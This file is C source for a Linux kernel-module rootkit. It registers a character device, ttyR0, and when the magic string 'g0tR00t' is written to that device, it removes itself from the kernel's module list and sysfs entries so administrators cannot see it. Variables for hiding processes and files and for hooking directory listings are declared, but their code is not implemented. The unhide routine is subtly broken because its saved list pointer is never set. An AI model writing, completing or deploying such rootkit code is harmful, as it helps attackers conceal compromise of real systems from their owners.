#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

#define DEBUG_ENABLED 1
#define MAX_PIDS 512
#define DEVICE_NAME "ttyR0"
#define CLASS_NAME "ttyR"

MODULE_LICENSE("Dual BSD/GPL");

#if defined(DEBUG_ENABLED) && DEBUG_ENABLED == 1
    # define DEBUG(...)		printk(KERN_INFO __VA_ARGS__)
#else
    # define DEBUG(...)
#endif

/*
* STATIC VARIABLES SECTION
* we don't want to have it visible in kallsyms and have access to it all the time
*/
void module_hide(void);
void module_show(void);

static int     rk_open  (struct inode *inode, struct file *f);
static ssize_t rk_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t rk_write (struct file *f, const char __user *buf, size_t len, loff_t *off);

static int            majorNumber; 
static struct class*  rkcharClass  = NULL;
static struct device* rkcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = rk_open,
  .read = rk_read,
  .write = rk_write,
};

static struct proc_dir_entry *proc_next;
static struct proc_dir_entry *proc_rk;

static int (*proc_readdir_orig)(struct file *f, void *, filldir_t);
static int (*fs_readdir_orig)(struct file *f, void *, filldir_t);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;

static char hide_files = 1;
static char module_hidden = 0;
static char module_status[1024];

static int
rk_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
rk_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t
rk_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   magic[] = "g0tR00t";
  struct cred *new_cred;
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data) {
    copy_from_user (data, buf, len);

    if (memcmp(data, magic, 7) == 0) {
          DEBUG("GOT MAGIC");
          module_hide();
    }
        kfree(data);
    }
    else {
        printk(KERN_ALERT "ttyRK:Unable to allocate memory");
    }
    
    return len;
}


/* MODULE HELPERS */
void module_hide(void) {
    if(module_hidden) return;
    list_del(&THIS_MODULE->list);
    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);
    module_hidden = !module_hidden;
}

void module_show(void) {
    int result;
    if(!module_hidden) return;
    list_add(&THIS_MODULE->list, module_previous);
    result=kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
    module_hidden = !module_hidden;
}

/* MODULE EXIT/INIT */
static int __init rk_init(void) {
    DEBUG("Initializing module");
    // Create char device

    if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0) {
        DEBUG("ttyRK failed to register a major number\n");
        return majorNumber;
    }

    DEBUG("ttyRK: major number %d\n", majorNumber);

    // Register the device class
    rkcharClass = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(rkcharClass)) {
        unregister_chrdev(majorNumber, DEVICE_NAME);
        DEBUG("ttyRK: Failed to register device class\n");
        return PTR_ERR(rkcharClass); 
    }

    DEBUG("ttyRK: device class registered correctly\n");

    // Register the device driver
    rkcharDevice = device_create(rkcharClass, NULL,
    MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
    if (IS_ERR(rkcharDevice)) {
        class_destroy(rkcharClass);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        DEBUG("ttyRK: Failed to create the device\n");
        return PTR_ERR(rkcharDevice);
    }

    return 0;
}

static int __exit rk_exit(void) {
    DEBUG("Cleanup module");
    // Destroy the device
    device_destroy(rkcharClass, MKDEV(majorNumber, 0));
    class_unregister(rkcharClass);                     
    class_destroy(rkcharClass);                        
    unregister_chrdev(majorNumber, DEVICE_NAME);     
    return 0;
}

module_init(rk_init);
module_exit(rk_exit);